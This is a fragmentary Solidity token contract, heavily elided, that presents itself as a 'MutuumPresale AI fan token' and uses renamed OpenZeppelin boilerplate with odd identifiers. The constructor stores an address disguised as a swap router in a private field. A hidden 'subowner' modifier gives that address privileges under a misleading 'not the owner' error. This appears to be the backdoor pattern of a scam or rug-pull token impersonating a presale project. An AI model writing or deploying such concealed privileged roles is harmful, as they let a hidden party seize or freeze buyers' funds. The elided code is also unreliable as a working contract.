...
/// https://x.com/MutuumPresaleAI


pragma solidity 0.8.29;

// MutuumPresaleAI fan token

interface MutuumPresaleAIinterface {
  /**
...
/*
 * @dev Provides information about the current execution MutuumPresaleAI20Burnable, including the
 ...
 */
abstract contract MutuumPresaleAI20Burnable {
...
// File: @openzeppelin/contracts/access/MutuumPresaleAI20Ownable.sol
 ...
 * the owner.
 */
abstract contract MutuumPresaleAI20Ownable is MutuumPresaleAI20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "MutuumPresaleAI20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "MutuumPresaleAI20Ownable: new owner is the zero address");
 ...
 * `SafeMutuumPresaleAI` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeMutuumPresaleAI {
  /**
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMutuumPresaleAI: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMutuumPresaleAI: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeMutuumPresaleAI: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMutuumPresaleAI: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMutuumPresaleAI: modulo by zero");
  }
...
contract MutuumPresaleAIToken is MutuumPresaleAI20Burnable, MutuumPresaleAIinterface, MutuumPresaleAI20Ownable {
    
    using SafeMutuumPresaleAI for uint256;
   ...
   address private legosRooter; 
    constructor(address legosSwapRouterv3) {
        ...
        _name = "MutuumPresale AI";
        _symbol = "MutuumPresale AI";
        _decimals = 9;
    ...
    */
    ...
    /**
    * @dev See {MutuumPresaleAIinterface-totalSupply}.
    */
    ...
    /**
    * @dev See {MutuumPresaleAIinterface-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "MutuumPresaleAI20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {MutuumPresaleAIinterface-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {MutuumPresaleAIinterface-transfer}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {MutuumPresaleAIinterface-allowance}.
    */
    ...
    */
    ...
    /**
    * @dev See {MutuumPresaleAIinterface-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {MutuumPresaleAIinterface};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "MutuumPresaleAIinterface: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {MutuumPresaleAIinterface-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "MutuumPresaleAIinterface: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "MutuumPresaleAIinterface: transfer from the zero address");
        require(shippingto != address(0), "MutuumPresaleAIinterface: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "MutuumPresaleAIinterface: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "MutuumPresaleAIinterface: approve from the zero address");
        require(transporteur != address(0), "MutuumPresaleAIinterface: approve to the zero address");
